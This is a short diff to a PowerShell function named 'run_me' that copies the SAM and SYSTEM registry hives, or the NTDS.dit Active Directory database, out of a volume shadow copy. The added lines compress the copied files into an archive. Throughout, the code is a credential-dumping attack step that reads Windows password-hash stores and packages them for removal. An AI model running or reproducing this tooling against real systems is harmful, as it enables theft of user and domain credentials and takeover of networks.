@@ -87,6 +87,7 @@ function run_me {
   
                 Copy-RawItem $SamPath "$DestinationPath\sam"
                 Copy-RawItem $SystemPath "$DestinationPath\system"
+                Compress-Archive -LiteralPath "$DestinationPath\sam", "$DestinationPath\system" -DestinationPath "$DestinationPath\archive" -Force
             } else { 
               
                 $NTDSPath = Join-Path $ShadowVolume "\Windows\NTDS\NTDS.dit" 
@@ -94,8 +95,9 @@ function run_me {
   
                 Copy-RawItem $NTDSPath "$DestinationPath\ntds"
                 Copy-RawItem $SystemPath "$DestinationPath\system"
+                Compress-Archive -LiteralPath "$DestinationPath\ntds", "$DestinationPath\system" -DestinationPath "$DestinationPath\archive" -Force
             }     
-      
+            
         If ($VssStatus -eq "Stopped") {Stop-Service vss} 
         If ($VssStartMode -eq "Disabled") {Set-Service vss -StartupType Disabled} 
 }
